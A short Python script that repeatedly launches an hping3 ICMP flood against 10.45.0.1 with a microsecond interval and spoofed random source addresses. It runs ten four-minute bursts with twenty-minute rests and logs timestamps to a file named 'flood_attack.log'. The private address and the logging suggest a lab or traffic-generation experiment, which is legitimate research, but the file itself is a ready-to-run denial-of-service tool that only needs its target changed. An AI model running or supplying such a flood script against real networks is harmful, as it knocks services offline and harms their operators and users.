import subprocess
import time
from datetime import datetime

def run_hping3():
    with open('flood_attack.log', 'a') as log_file:
        for i in range(10):
            start_time = datetime.now()
            log_file.write(f"Start time: {start_time}\n")
            log_file.flush()

            # Run the hping3 command for 4 minutes
            process = subprocess.Popen(['hping3', '-1', '10.45.0.1', '-i', 'u10', '--rand-source'], stdout=log_file, stderr=log_file)
            time.sleep(4 * 60)  # Sleep for 4 minutes
            process.terminate()  # Terminate the process after 4 minutes

            end_time = datetime.now()
            log_file.write(f"End time: {end_time}\n")
            log_file.flush()

            # Rest for 20 minutes
            time.sleep(20 * 60)

if __name__ == "__main__":
    run_hping3()